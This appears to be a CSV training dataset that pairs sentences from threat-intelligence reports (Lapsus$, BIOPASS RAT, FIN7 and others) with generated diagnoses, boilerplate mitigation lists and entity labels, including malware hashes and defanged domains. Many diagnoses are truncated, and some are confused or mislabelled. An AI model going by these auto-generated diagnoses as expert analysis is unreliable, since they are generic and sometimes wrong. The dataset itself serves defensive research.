2594,"in december 2021, the ministry of health of brazil fell victim to an attack claimed by lapsus$ (figure 2).",cybersecurity issue: attack entity: ministry of health of brazil relationship: targeted by threat actor lapsus$ diagnosis: the ministry of health of brazil experienced a targeted cyber attack by the threat actor group lapsus$.,1. implementing multi-factor authentication for all employees accessing the ministry of health's network to prevent unauthorized access. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security gaps in the network. 3. deploying advanced threat detection and prevention tools such as intrusion detection systems and firewalls to monitor network activity and block malicious traffic. 4. providing regular cybersecurity training and awareness programs for all employees to educate them on best practices for identifying and responding to cyber threats. 5. developing an,TIME,threat-actor,identity
3911,"based on our investigation, the chopper web shell is dropped via a system token, potentially via a microsoft exchange server vulnerability.",the diagnosis is that a vulnerability in microsoft exchange server is being exploited to drop the chopper web shell malware.,1. patching and updating the microsoft exchange server to the latest version to address the vulnerability. 2. implementing multi-factor authentication to prevent unauthorized access to the server. 3. installing intrusion detection and prevention systems (idps) to detect and block any attempts to exploit the vulnerability. 4. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the server's security. 5. implementing network segmentation to isolate the microsoft exchange server from other systems and networks. 6. implement,vulnerability,malware,
4460,"at the time, our android team released research about a newly discovered family of spyware related to pegasus that was used in a targeted attack on a small number of android devices.","the diagnosis is a targeted attack on android devices using a newly discovered family of spyware related to pegasus, which is a type of malware. the entity affected is android devices, and the relationship between the entities is that the malware targeted the devices.",1. implementing regular software updates and security patches to prevent vulnerabilities that can be exploited by the spyware. 2. installing antivirus software on android devices to detect and remove the spyware. 3. educating users on safe browsing habits and avoiding suspicious links and downloads. 4. implementing network security measures such as firewalls and intrusion detection systems to prevent the spyware from accessing the network. 5. conducting regular security audits and vulnerability assessments to identify and address any weaknesses in the system. 6,malware,SOFTWARE,identity
554,"for example, the xorist ransomware (sha256: 4979a10b81c41ecc0fc3a0f376ade766ce616d2301639f74e0277047cc40e3d6) demanded £1,000 for a ransom; the bitcoin wallet address was 1bfqrlcdwwrxuey7ffdn8dqeoaspjignxt.","diagnosis: xorist ransomware (malware) has infected the software entity, indicated by the hash (sha256: 4979a10b81c41ecc0fc3a0f376ade766ce616d230",1. implement regular software updates and security patches to prevent vulnerabilities that can be exploited by ransomware. 2. use endpoint protection software that can detect and block ransomware attacks. 3. educate employees on how to identify and avoid phishing scams and suspicious emails or attachments. 4. implement a data backup and recovery plan to restore systems and data in case of a ransomware attack. 5. use encryption to protect sensitive data and prevent unauthorized access. 6. implement network segmentation to limit the spread of ransom,hash,malware,SOFTWARE
4804,"here is a deeper look at some campaign activity tag has observed since our last update: turla, a group publicly attributed to russia’s federal security service (fsb), recently hosted android apps on a domain spoofing the ukrainian azov regiment.","the diagnosis is that the threat actor turla, attributed to russia's federal security service, has hosted android apps on a domain spoofing the ukrainian azov regiment. turla has impersonated the azov regiment and used software to carry out","1. implement strict domain verification processes to prevent domain spoofing and impersonation. 2. conduct regular vulnerability assessments and penetration testing to identify software vulnerabilities and patch them before they can be exploited. 3. deploy advanced threat detection and prevention tools that can identify and block turla's malicious activities before they can cause harm. 4. educate employees on the dangers of phishing and social engineering attacks, and how to identify and report suspicious activity. 5. implement multi-factor authentication and access controls to prevent unauthorized",identity,threat-actor,SOFTWARE
304,"last tuesday, trusteer reported that a new variant of citadel, which has long relied on vnc to give attackers remote control over systems, began adding new credentials to systems it infects and enabling the standard windows remote desktop application (rdp).","the diagnosis is that a new variant of citadel malware has been discovered, which now adds new credentials to systems it infects and enables the standard windows remote desktop application. trusteer reported this cybersecurity issue, and the relationship between the malware and the tools used","1. implementing strong access controls and authentication mechanisms to prevent unauthorized access to systems and sensitive data. 2. installing and regularly updating anti-malware software to detect and remove citadel malware and its variants. 3. conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the system. 4. enforcing strict security policies and procedures, including employee training and awareness programs, to minimize the risk of cyber attacks. 5. implementing network segmentation and isolation to limit the spread of malware",malware,tools,tools
13156,"a sample scenario of the usbferry attack tropic trooper is well aware that military or government organizations may have more robust security in their physically isolated environments (i.e., the use of biometrics or usb use in a quarantined machine before an air-gapped environment).","diagnosis: the usbferry attack is a cybersecurity issue caused by the malware entity. the threat actor entity is related to the malware entity through the ""related-to"" relationship, indicating that the threat actor is likely responsible for deploying the malware. this",1. implement strict access controls and permissions for usb devices to prevent unauthorized access and use. 2. use anti-virus and anti-malware software to detect and prevent malware attacks. 3. conduct regular security audits and vulnerability assessments to identify and address potential weaknesses in the system. 4. educate employees on the risks of usb devices and the importance of safe computing practices. 5. monitor network traffic and behavior to detect and prevent suspicious activity. 6. implement multi-factor authentication to prevent unauthorized access to,threat-actor,malware,
4376,"in december 2021, tag discovered a novel charming kitten tool, named hyperscrape, used to steal user data from gmail, yahoo!, and microsoft outlook accounts.","diagnosis: charming kitten conducted a cyber attack in december 2021 using a new tool called hyperscrape to steal user data from gmail, yahoo!, and microsoft outlook accounts. the malware was authored by the threat actor and used",1. implementing multi-factor authentication (mfa) for all email accounts to prevent unauthorized access. 2. regularly updating and patching software to ensure that all vulnerabilities are addressed. 3. conducting regular security awareness training for employees to help them identify and report suspicious activity. 4. installing anti-malware and intrusion detection software on all devices to detect and prevent malware infections. 5. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network. 6. implement,threat-actor,TIME,identity
1858,deploying across the network we saw software deployment tool pdq being used to deploy malicious batch scripts to multiple endpoints in the network.,"the diagnosis is a cyber attack using a malicious batch script deployed through the software deployment tool pdq, which was used to target multiple endpoints in the network. the attacker utilized the tool's functionality to propagate the attack and compromise multiple systems simultaneously. the attack",1. implement access controls and permissions to limit the use of software deployment tools like pdq to authorized personnel only. 2. regularly update and patch software deployment tools to prevent vulnerabilities that can be exploited by attackers. 3. deploy endpoint protection solutions that can detect and block malicious batch scripts and other types of malware. 4. conduct regular vulnerability assessments and penetration testing to identify and address potential security weaknesses in the network. 5. implement network segmentation to isolate critical systems and limit the spread of attacks to other,attack-pattern,tools,
13921,"based on trend micro data, the us is by far darkside’s most targeted country, at more than 500 detections, followed by france, belgium, and canada.","darkside malware is targeting multiple countries, with the us being the most targeted location, followed by france, belgium, and canada. the entities involved in this cybersecurity issue are darkside malware and the targeted locations. the relationship between them is that the malware","1. implement strong cybersecurity protocols and firewalls to prevent the infiltration of darkside malware into computer systems. 2. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the systems. 3. train employees on cybersecurity best practices, such as avoiding suspicious emails and links, and keeping software up to date. 4. utilize threat intelligence tools to monitor and identify potential threats, including darkside malware. 5. implement multi-factor authentication to prevent unauthorized access to sensitive data and systems. 6",malware,location,location
679,"an example for such attack vector being leveraged by attackers is cve-2018-4878, an adobe flash player zero-day exploited by embedding malicious swf files in excel documents.","the entity software has a vulnerability labeled cve-2018-4878, which is being exploited by an attack pattern that involves embedding malicious swf files in excel documents. this suggests a potential cybersecurity breach that requires immediate attention and remediation.",1. patch management: apply the latest security patches to the software to fix the vulnerability that is being exploited. 2. endpoint protection: deploy an endpoint protection solution that can detect and block the malicious swf files from executing on the system. 3. email filtering: implement email filtering technologies that can detect and block excel documents containing malicious swf files. 4. user awareness training: provide training to users on how to identify and avoid phishing emails that may contain malicious attachments. 5. network segmentation:,vulnerability,SOFTWARE,attack-pattern
3411,biopass rat loader backdoor.win64.biopass.a bd8dc7e3909f6663c0fff653d7afbca2b89f2e9bc6f27adaab27f640ccf52975 silverlight.exe,the diagnosis is that the silverlight.exe entity is infected with the biopass rat loader backdoor malware (backdoor.win64.biopass.a) identified by the hash value bd8dc7e3909f6663c0fff,"1. remove the infected silverlight.exe entity and replace it with a clean version from a trusted source. 2. conduct a comprehensive malware scan on all systems and devices connected to the infected entity to detect and remove any other instances of the biopass rat loader backdoor malware. 3. implement a robust endpoint protection solution that includes antivirus, anti-malware, and firewall technologies to prevent future infections. 4. educate employees on the dangers of opening suspicious emails or downloading files from untrusted sources",malware,hash,malware
4812,"in this case, the android app name was stopwar.apk (com.ddos.stopwar) and was distributed from the website stopwar.pro.","diagnosis: the android app stopwar.apk (com.ddos.stopwar) is identified as malware and was distributed from the website stopwar.pro, which is also identified as a malicious url. the relationship between the two entities is that the website","1. implement a robust anti-malware software that can detect and remove the stopwar.apk (com.ddos.stopwar) malware from android devices. 2. use web filtering software to block access to the malicious url stopwar.pro, preventing users from downloading the malware. 3. conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the organization's cybersecurity infrastructure that may have allowed the malware to be distributed. 4. educate employees and users about the risks of downloading apps",malware,SOFTWARE,malware
4171,"after checking the backdoor smilesvr, we found that there was a code similarity between it and troj_yahamam, which was used by earth centaur in an earlier operation.","the threat actor earth centaur used the troj_yahamam malware, which has code similarities with the backdoor smilesvr. it is likely that the threat actor is responsible for the cybersecurity issue and used the same code to exploit the system",1. implementing a robust antivirus software that can detect and block known malware and suspicious activities on the system. 2. conducting regular vulnerability assessments and penetration testing to identify and fix security loopholes in the system. 3. enforcing strict access controls and user authentication policies to prevent unauthorized access to the system. 4. implementing network segmentation to isolate critical assets and limit the spread of malware in case of a breach. 5. implementing intrusion detection and prevention systems to detect and block malicious activities in,malware,threat-actor,
14265,figure 1. tweets that mention virtual girlfriend and the short link of hxxp://miakhalifagame[.]com/ maikspy on the android platform figure 2.,"diagnosis: the cybersecurity issue is malware on the android platform, specifically related to a url for a virtual girlfriend game. the entity involved is the miakhalifagame[.]com website. the relationship between entities is that the url is related",1. implementing a robust antivirus program on the android platform to detect and remove malware. 2. blocking access to the miakhalifagame[.]com website through firewalls and web filters. 3. educating users about the risks of downloading apps and games from untrusted sources. 4. conducting regular security audits to identify and address vulnerabilities in the android platform. 5. implementing two-factor authentication to prevent unauthorized access to sensitive data on the android device. 6. using a virtual,URL,malware,SOFTWARE
1035,"based on our investigation, we believe that stolen accounts for these universities are actively selling on taobao.",the cybersecurity issue is a stolen account being sold on taobao. the entity involved is a university. the relationship between the entities is that the attack pattern is related to the software used by the university. the diagnosis is that the university's software was likely,1. implement two-factor authentication for all user accounts to prevent unauthorized access. 2. conduct regular security audits to identify vulnerabilities in the university's software and address them promptly. 3. monitor the dark web for any stolen university account information and take immediate action to remove it. 4. educate university staff and students on the importance of strong passwords and how to avoid phishing scams. 5. consider implementing a security information and event management (siem) system to detect and respond to security incidents in real-time,SOFTWARE,attack-pattern,
370,"after analysis of the compromise, volexity determined the initial foothold was the result of a remote code execution vulnerability in confluence server and data center.","diagnosis: a remote code execution vulnerability in confluence server and data center was exploited, leading to a compromise. the compromised entity was a software, specifically confluence server and data center. the vulnerability was the result of a vulnerability in the software,",1. regularly update and patch the confluence server and data center software to address any known vulnerabilities. 2. implement a network segmentation strategy to isolate critical systems from the rest of the network and limit the potential impact of a compromise. 3. implement access control measures to limit the number of users who have administrative access to the confluence server and data center software. 4. implement intrusion detection and prevention systems to monitor network traffic and detect any suspicious activity. 5. conduct regular security audits and penetration testing,vulnerability,SOFTWARE,identity
5462,"we stumbled upon the confucius hacking group while delving into patchwork’s cyberespionage operations, and found a number of similarities.","possible diagnosis: the confucius hacking group and patchwork are related threat actors, possibly operating under the same or affiliated organizations. this suggests a coordinated and sophisticated cyberespionage campaign, with potential implications for targeted entities' sensitive data and intellectual property.",1. implementing multi-factor authentication for all users to prevent unauthorized access to sensitive data and intellectual property. 2. regularly updating and patching software and systems to prevent vulnerabilities that could be exploited by threat actors. 3. conducting regular security audits and penetration testing to identify and address any weaknesses in the organization's cybersecurity defenses. 4. deploying advanced threat detection and response tools to quickly identify and respond to any suspicious activity or potential cyberattacks. 5. providing regular cybersecurity awareness training for all employees,threat-actor,threat-actor,
4475,"most recently, we reported in may on five zero-day vulnerabilities affecting chrome and android which were used to compromise android users.","diagnosis: the cybersecurity issue is a zero-day vulnerability affecting chrome and android, which was exploited to compromise android users. the entities involved are the vulnerable software (chrome and android) and the vulnerability itself. the relationship between the entities is that the vulnerable",1. patch and update the vulnerable software (chrome and android) to address the zero-day vulnerability and prevent further exploitation. 2. implement intrusion detection and prevention systems to detect and block any attempts to exploit the vulnerability. 3. conduct regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities before they can be exploited. 4. implement multi-factor authentication and access controls to limit access to sensitive data and systems. 5. educate users on safe browsing habits and the importance of keeping their software up,SOFTWARE,vulnerability,SOFTWARE
13940,"jon clay, director of global threat communications at trend micro, outlines the phases of ransomware:","cybersecurity issue: ransomware entity: jon clay, director of global threat communications at trend micro relationship: jon clay is providing information about the phases of ransomware. diagnosis: jon clay is likely a cybersecurity expert or professional","implementing strong anti-malware software, conducting regular backups, and educating employees on safe browsing practices are potential solutions to combat ransomware attacks. additionally, implementing multi-factor authentication and regularly updating software can also help prevent ransomware attacks. it is important for organizations to have a comprehensive incident response plan in place in case of a ransomware attack.",identity,identity,
3199,authenticode-signed files are either downloaded from the official websites (as seen in sample c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5) or are hosted on alibaba cloud oss on the attackers’ account.,the entity with the hash value (9783) is related to the infrastructure entity (48324) through the relationship of being hosted on alibaba cloud oss on the attacker's account. the diagnosis is that there is a potential cybersecurity issue with the authenticity of,1. implement multi-factor authentication for accessing cloud accounts to prevent unauthorized access. 2. regularly monitor and audit cloud accounts for any suspicious activity or changes. 3. implement intrusion detection and prevention systems to detect and prevent unauthorized access and attacks. 4. use secure communication protocols such as ssl/tls to ensure the authenticity and integrity of data transmitted between entities. 5. conduct regular security assessments and penetration testing to identify and address any vulnerabilities in the system.,Infrastucture,hash,
2557,"and from this we can see how credential theft is the keystone of shamoon 2 attacks; if an organization can prevent credential theft, the shamoon 2 attacks can’t succeed.",credential theft is the cause of shamoon 2 attacks. the threat actors use the stolen credentials to launch the attacks. the organization needs to prevent credential theft to avoid the shamoon 2 attacks. the diagnosis is that the organization needs to implement strong,"1. implement multi-factor authentication (mfa) to add an extra layer of security to user credentials. 2. conduct regular security awareness training for employees to educate them on how to recognize and avoid phishing attacks, which are a common method used to steal credentials. 3. use password managers to generate and store strong, unique passwords for each user account. 4. implement access controls to limit the number of users who have access to sensitive data and systems. 5. regularly monitor network activity and user behavior",attack-pattern,attack-pattern,threat-actor
3433,aos.exe biopass rat binary (pyinstaller) trojan.win32.biopass.a afbfe16cbdd574d64c24ad97810b04db509505522e5bb7b9ca3b497efc731045 socketio.exe biopass rat binary (nuitka) trojan.win32.biopass.a 0b9f605926df4ff190ddc6c11e0f5839bffe431a3ddfd90acde1fcd2f91dada3 socketio.exe biopass rat binary (nuitka) trojan.win32.biopass.a 6fc307063c376b8be2d3a9545959e068884d9cf7f819b176adf676fc4addef7d flash_ins_bak.exe biopass rat binary (nuitka) trojan.win32.biopass.a 7249ad971283e164b0489110c23f4e40c64ee49b49bcc5cd0d32d9e701ec2114 files.zip biopass rat binary (nuitka) trojan.win32.biopass.a de17e583a4d112ce513efd4b7cb575d272dcceef229f81360ebdfa5a1e083f11 fn.exe biopass rat binary (nuitka) trojan,"the diagnosis is a trojan.win32.biopass.a infection that has affected multiple files including aos.exe, socketio.exe, flash_ins_bak.exe, and files.zip. these files are all biopass rat binaries (nuitka) and contain",1. install and regularly update antivirus software to detect and remove the trojan.win32.biopass.a infection. 2. use a firewall to block unauthorized access to the system and prevent the trojan from communicating with its command and control server. 3. implement file integrity monitoring to detect any changes or modifications to critical files and folders. 4. conduct regular vulnerability assessments and penetration testing to identify and address any security weaknesses in the system. 5. educate employees on safe browsing habits and the dangers of downloading,hash,hash,hash
3437,threat actors can exploit this vulnerability to bypass authentication and run arbitrary code on unpatched systems.,"the diagnosis is a vulnerability exploitation attack, where threat actors can bypass authentication and execute arbitrary code on unpatched systems. the vulnerability is the target entity, while the threat actors are the attack patterns. the relationship between the entities is that the attack patterns","1. patch management: regularly update software and operating systems to ensure all vulnerabilities are patched and up-to-date. 2. two-factor authentication: implement two-factor authentication to add an extra layer of security to the authentication process, making it more difficult for threat actors to bypass. 3. network segmentation: implement network segmentation to separate sensitive data from the rest of the network, making it more difficult for threat actors to access sensitive data. 4. intrusion detection and prevention systems: implement intrusion detection",attack-pattern,vulnerability,attack-pattern
3684,we detected a variant of the carbanak malware that adds registry entries and keys as an autostart technique.,"the entity has been targeted by a carbanak malware attack, which utilizes an autostart technique by adding registry entries and keys.",1. implementing robust firewalls and intrusion prevention systems to detect and block malicious traffic. 2. regularly updating and patching software to prevent vulnerabilities that can be exploited by malware. 3. deploying antivirus and anti-malware software to detect and remove any malicious code. 4. implementing access controls and user authentication mechanisms to prevent unauthorized access to sensitive data. 5. conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the system. 6. educating employees on,malware,attack-pattern,
4356,"it should be noted that in some occasions, the threat actor sent spear-phishing emails from the domain name mailerservice[.]directory which we attributed to the patchwork threat actor in previous research.",the diagnosis is a spear-phishing attack conducted by the patchwork threat actor using the domain name mailerservice[.]directory. the threat actor was attributed to the attack based on previous research.,"1. implement email authentication protocols such as spf, dkim, and dmarc to prevent spoofing of email domains. 2. conduct regular phishing awareness training for employees to recognize and report suspicious emails. 3. use advanced threat intelligence solutions to detect and block known threat actors and their tactics. 4. implement network segmentation to prevent lateral movement of attackers in case of a successful spear-phishing attack. 5. deploy endpoint protection solutions that can detect and prevent malware infections from spear-phishing attacks.",attack-pattern,url,threat-actor
3611,indicators of compromise (iocs) indicator attribution trend micro pattern detection 068d32a43191dc0164b600b85a1621be0154504fd477167422ff4a8fb3406d73 animalgames backdoor.,the entity animalgames has been compromised by the backdoor malware identified as trend micro pattern detection 068d32a43191dc0164b600b85a1621be0154504fd477167422ff4a8fb3406,"1. install and regularly update antivirus software that includes behavior-based detection capabilities to identify and block malware like backdoor trojans. 2. implement network segmentation to isolate critical systems, such as those that store sensitive data or manage critical infrastructure, from less secure areas of the network. 3. use intrusion detection and prevention systems to monitor network traffic for suspicious activity and block or alert on potential threats. 4. conduct regular vulnerability scans and penetration testing to identify and address potential security weaknesses in the network and systems",hash,identity,malware
3389,test3.exe biopass rat loader backdoor.win64.biopass.a 344cdbc2a7e0908cb6638bc7b81b6b697b32755bad3bed09c511866eff3876c7,"the diagnosis is that the entity ""test3.exe"" is infected with the malware ""backdoor.win64.biopass.a"" which is indicated by the hash value ""344cdbc2a7e0908cb6638bc7b","1. quarantine the infected file ""test3.exe"" to prevent further spread of the malware. 2. use an antivirus software to scan and remove the malware from the infected system. 3. implement a firewall to block unauthorized access to the system and prevent the malware from communicating with its command and control server. 4. conduct regular system updates and patches to ensure that vulnerabilities are fixed and prevent future malware infections. 5. educate users on cybersecurity best practices to avoid downloading malicious files and phishing attempts that",malware,hash,malware
4250,"decompiled form structure of patchwork’s sample (795ae4097aa3bd5932be4110f6bd992f46d605d4c9e3afced314454d35395a59, detected as troj_delf.xxwz)",the diagnosis is that a threat actor has used a malware sample (detected as troj_delf.xxwz) that is indicated by a hash value.,1. implementing an advanced threat protection solution that uses machine learning algorithms to detect and block malware samples based on their hash values. 2. deploying a network intrusion detection system (nids) that can monitor network traffic and alert security teams when it detects the presence of troj_delf.xxwz or similar malware samples. 3. conducting regular vulnerability assessments and penetration testing to identify and address weaknesses in the organization's security posture that could be exploited by threat actors. 4. implement,threat-actor,hash,malware
13642,"the fraudsters, whom we named “water nue,” primarily target accounts of financial executives to obtain credentials for further financial fraud.","targeted phishing attack by threat actor water nue against financial executives, resulting in credential theft and potential financial fraud. diagnosis: phishing and social engineering attack.",1. employee training and awareness programs to educate financial executives on how to identify and avoid phishing attacks. 2. two-factor authentication for all financial accounts to prevent unauthorized access. 3. implementation of email filters and firewalls to detect and block phishing attempts. 4. regular penetration testing and vulnerability assessments to identify and address any security gaps. 5. encryption of sensitive data to prevent unauthorized access in case of a successful attack.,threat-actor,identity,
613,the hot spots in the united states represents distribution servers which are created using fraud based accounts at various hosting providers that are hosting the hancitor documents while the hotspots in asia represent legitimate sites for small and medium businesses that have been compromised by the actors behind hancitor campaign to host the malicious hancitor documents.,"the diagnosis is that the hancitor campaign is using fraud-based accounts at various hosting providers in the united states to distribute their malicious documents. meanwhile, in asia, the campaign is compromising legitimate small and medium businesses to host the same malicious documents. the","1. implementing stricter authentication and verification processes for account creation at hosting providers to prevent fraud-based accounts from being created. 2. conducting regular security audits and vulnerability assessments of small and medium businesses to identify and mitigate potential security risks. 3. deploying advanced threat detection and prevention tools such as intrusion detection systems, firewalls, and anti-malware software to detect and block malicious documents from being distributed. 4. providing regular cybersecurity training and awareness programs to educate employees on how to identify and prevent",malware,location,location
4908,"some commodity malware used included redline, vidar, predator the thief, nexus stealer, azorult, raccoon, grand stealer, vikro stealer, masad (google’s naming), and kantal (google’s naming) which shares code similarity with vidar.","the entities listed in the first column are all types of malware. the relationship listed in the third column indicates that kantal shares code similarity with vidar, suggesting that they may have a common origin or be related in some way. the cybersecurity issue described",the potential cybersecurity solutions to address the issue of malware code similarity and common origin include: 1. implementing advanced threat intelligence tools that can detect and analyze malware code similarities across different types of malware. this can help identify potential relationships between different malware families and enable organizations to take proactive measures to prevent future attacks. 2. deploying advanced endpoint protection solutions that can detect and block malware before it can execute on endpoints. this can help prevent the spread of malware across an organization's network and reduce the risk of,malware,malware,malware
4471,"for example, tag discovered campaigns targeting armenian users which utilized zero-day vulnerabilities in chrome and internet explorer.","diagnosis: the entity tag discovered campaigns targeting armenian users, which utilized zero-day vulnerabilities in chrome and internet explorer. the campaigns targeted a location (armenian users) and utilized exploits (zero-day vulnerabilities) in two software entities (chrome and internet",1. patch management: regularly updating software with the latest security patches can prevent zero-day vulnerabilities from being exploited by attackers. 2. network segmentation: segregating networks can help limit the spread of malware and prevent attackers from accessing sensitive information. 3. user education: educating users on safe browsing practices and how to identify phishing emails or suspicious links can help prevent successful attacks. 4. intrusion detection and prevention systems: implementing network and host-based intrusion detection and prevention systems can help detect,campaign,identity,SOFTWARE
14072,"we can see how the freenki malware, previous slub campaigns, and operation earth kitsune share many common ttps in their delivery and persistence mechanisms.","the diagnosis is that there is a high likelihood of a coordinated cyber attack involving the freenki malware, previous slub campaigns, and operation earth kitsune. the common tactics, techniques, and procedures (ttps) used in the delivery and",1. implementing multi-factor authentication to prevent unauthorized access to sensitive systems and data. 2. conducting regular security awareness training for employees to educate them on the latest cyber threats and best practices. 3. deploying advanced threat detection and prevention tools that can identify and block malicious activity in real-time. 4. regularly updating and patching all software and systems to address known vulnerabilities. 5. conducting regular penetration testing and vulnerability assessments to identify and remediate any weaknesses in the security posture. 6,malware,malware,campaign
3692,fin7 attacks can and inject code into processes and hijack the search order used to load dll files.,the diagnosis is a potential compromise of the entity by fin7 threat actors through the injection of malicious code into processes and hijacking of dll file search order.,1. implementing network segmentation to isolate critical systems and limit the spread of malware. 2. conducting regular vulnerability assessments and patch management to ensure all systems are up-to-date and secure. 3. implementing multi-factor authentication for all user accounts to prevent unauthorized access. 4. deploying intrusion detection and prevention systems to monitor network traffic and detect any suspicious activity. 5. implementing a robust incident response plan to quickly detect and respond to any security incidents. 6. conducting regular security awareness training,threat-actor,attack-pattern,attack-pattern
3555,we took a look at one of the samples captured from capesand that was used to deploy the njrat malware – notably its main executable notepadex.,"diagnosis: the cybersecurity issue is the presence of the njrat malware, specifically its main executable notepadex. the entity involved is capesand, which is the source of the sample. the relationship between the entities is that capesand","1. implementing a robust antivirus and anti-malware solution that can detect and remove the njrat malware and its associated files, including notepadex. 2. conducting regular vulnerability assessments and penetration testing to identify any weaknesses in the organization's security posture that may have allowed the malware to infiltrate the system. 3. implementing strict access controls and user permissions to limit the ability of attackers to execute malicious code or access sensitive data. 4. educating employees on the dangers of phishing",malware,malware,
3379,test3.exe biopass rat loader backdoor.win64.biopass.a 281c938448e32eb12fe8c5439ef06cea848668cf57fed5ad64b9a8d1e07de561,the diagnosis is a cybersecurity attack involving the biopass rat loader backdoor malware (backdoor.win64.biopass.a) which was detected in the test3.exe file. the file's hash value is 281c938448e32,"1. implement a robust anti-malware solution that can detect and block the biopass rat loader backdoor malware and other similar threats. 2. conduct regular system scans to detect and remove any malware or suspicious files. 3. implement strong access control measures to prevent unauthorized access to sensitive files and systems. 4. conduct regular security audits to identify vulnerabilities and address them promptly. 5. educate employees on cybersecurity best practices, such as avoiding suspicious emails and websites and not downloading or opening attachments from",malware,hash,FILEPATH
3369,cdaemon.txt biopass rat python script (cdaemon module) trojan,"the entity ""biopass rat python script (cdaemon module)"" has been diagnosed with a trojan malware infection, as indicated by the relationship between the entity and the ""cdaemon.txt"" file path.",1. implementing a robust antivirus solution that can detect and remove trojan malware infections. 2. conducting regular security audits to identify and address vulnerabilities in the system. 3. implementing network segmentation to isolate critical systems and prevent the spread of malware. 4. implementing access controls and authentication mechanisms to prevent unauthorized access to the system. 5. educating employees on the importance of cybersecurity and safe browsing practices to prevent the installation of malware. 6. implementing intrusion detection and prevention systems to detect and,malware,FILEPATH,
1992,"during the analysis of the microbackdoor sample, unit 42 observed the configuration and found an embedded ip address, belonging to a threat actor we believe is potentially the developer: x4k, also known as l4ckyguy, unkn0wn, unk0w, _unkn0wn and x4kme.","the diagnosis is that the microbackdoor sample contains malware which has an embedded ip address belonging to a threat actor named x4k, also known as l4ckyguy, unkn0wn, unk0w, _unkn0wn",1. implementing intrusion detection and prevention systems to detect and block any traffic to and from the identified ip address. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security gaps that could be exploited by the threat actor. 3. implementing network segmentation to isolate critical systems and limit the potential impact of a successful attack. 4. implementing strong authentication and access controls to prevent unauthorized access to sensitive systems and data. 5. implementing endpoint security solutions such as anti-virus,threat-actor,malware,threat-actor
345,"on october 19, the kafeine posted a blog discussing the inclusion of cve-2014-0556 in the nuclear pack exploit kit, which was installing cryptowall 2.0.","the diagnosis is that a threat actor authored the malware, which delivers cryptowall 2.0 through the use of exploits targeting the cve-2014-0556 vulnerability.",1. patching and updating software regularly to prevent vulnerabilities like cve-2014-0556 from being exploited. 2. implementing intrusion detection and prevention systems that can detect and block malware before it can execute. 3. implementing endpoint protection solutions that can detect and block malware at the endpoint level. 4. implementing network segmentation to prevent the spread of malware throughout the network. 5. implementing strong access controls and authentication mechanisms to prevent unauthorized access to systems and data. 6. conducting,TIME,malware,vulnerability
3977,"indicators of compromise filename path sha-256 detection notes ss.exe c:\temp\ ee63b49aca1495a170ea7273316385b606f3fd2df1e48e9f4de0f241d98bd055 hacktool.win32.catlike.a vulnerability scanner lg.exe c:\temp\ c:\hp\ 5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9 hacktool.win32.joeware.a. joeware local group manipulation tool lg.dat c:\hp\ 5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9 hacktool.win32.joeware.a. joeware local group manipulation tool mpbd6d42.dat c:\users c:\perflogs c:\hp c:\temp e9be71848d1faa0c41db4c6a1e901747d98fb0b3cca027f8be85ea5e339b75e3 hacktool.msil.mimikatz.af mimikatz tags endpoints | apt & targeted attacks | research | network | articles, news, reports","the diagnosis is that the system has been compromised by several hacking tools and malware. the entities involved include files with the names ss.exe, lg.exe, lg.dat, and mpbd6d42.dat, located in various paths such as c:\temp",1. install and regularly update antivirus software to detect and remove malware. 2. implement a firewall to block unauthorized access to the system. 3. conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the system. 4. use strong passwords and implement multi-factor authentication to prevent unauthorized access to the system. 5. limit user privileges and access to sensitive data to reduce the risk of a breach. 6. implement intrusion detection and prevention systems to detect and block malicious activity. 7. train,hash,hash,hash
3408,biopass rat loader backdoor.win64.biopass.a 98a91356e0094c96d81bd27af407dd48c3c91aaf97da6794aeb303597a773749 silverlight1.exe,"the diagnosis is that the entity silverlight1.exe has been infected with the biopass rat loader backdoor.win64.biopass.a malware, identified by the hash 98a91356e0094c96d81bd27af",1. use antivirus software to scan and remove the biopass rat loader backdoor.win64.biopass.a malware. 2. update the operating system and software to the latest patches and versions to prevent vulnerabilities that can be exploited by malware. 3. implement network segmentation to isolate the infected entity and prevent the malware from spreading to other parts of the network. 4. use endpoint detection and response (edr) tools to monitor and detect suspicious activity on endpoints. 5. conduct employee training on,malware,hash,malware
532,"one example here is makop, contained in a 7z archive along with an infostealer malware (sha256: de6dfa018773e07c218ef1df62ce0d99a708841bf1ddfb4c6ad7e323d5d666a4).",the diagnosis is that the entity makop has been infected with an infostealer malware (identified by sha256: de6dfa018773e07c218ef1df62ce0d99a708841bf1ddfb4c,1. install and regularly update anti-malware software to detect and remove infostealer malware like the one identified by sha256: de6dfa018773e07c218ef1df62ce0d99a708841bf1ddfb4c. 2. implement network segmentation to limit the spread of malware within the network. 3. conduct regular security audits and vulnerability assessments to identify and address potential security gaps. 4. educate employees on safe browsing habits and the risks of,malware,hash,tools
13800,"therefore, the first-stage shellcode takes the pid of the windows service — which the first-stage shellcode and the succeeding backdoor both inject into — hides the target process, and embeds that pid into the second-stage shellcode.","the diagnosis for this cybersecurity issue is a targeted attack using a backdoor. the entity being targeted is a windows service, which is being injected with shellcode. the relationship between the entities suggests that the attack is using tools to duplicate the shellcode and",1. implement a strong firewall and intrusion detection system to prevent unauthorized access to the windows service and detect any attempts to inject shellcode. 2. regularly update and patch the operating system and all software to prevent vulnerabilities that can be exploited by attackers. 3. use antivirus software to detect and remove any malware that may be present on the system. 4. implement access controls and user permissions to limit the ability of attackers to access and modify critical system files. 5. use encryption to protect sensitive data and,tools,SOFTWARE,attack-pattern
